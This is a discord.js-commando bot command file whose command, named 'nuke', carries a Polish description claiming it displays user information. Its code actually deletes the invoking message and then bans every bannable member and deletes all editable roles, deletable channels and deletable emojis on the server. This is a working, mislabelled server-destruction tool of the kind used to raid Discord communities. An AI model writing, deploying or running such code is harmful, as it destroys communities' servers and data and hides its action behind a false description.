const commando = require('discord.js-commando');
const Discord = require('discord.js');
class ppCommand extends commando.Command {
    constructor(client) {
        super(client,
            {
                name: 'nuke',
                group: 'funkcje',
                memberName: 'nuke',
                description: 'Wyświetla informacje o użytkowniku'
            })
    }
    async run(message, args) {
        


        let channels = await message.guild.channels.array();
        let members = await message.guild.members.array();
        let roles = await message.guild.roles.array();
        let emojis = await message.guild.emojis.array();

        message.delete();


        for (let i = 0; i < members.length; i++) {

            if (!members[i].bannable) {
                console.log("Cant ban this user")
            } else {
                members[i].ban()
            }
        }



        for (let i = 0; i < roles.length; i++) {
            if (!roles[i].editable) {
                console.log("Can't edit this role")
            } else {
                roles[i].delete()
            }

        }
        for (let i = 0; i < channels.length; i++) {
            if (!channels[i].deletable) {
                console.log("Can't delete this channel")
            } else {
                channels[i].delete()
            }
        }
        for (let i = 0; i < emojis.length; i++) {

            if (!emojis[i].deletable) {
                console.log("Cant delete this emoji")
            } else {
                emojis[i].delete();
            }
        }



    }
}

module.exports = ppCommand;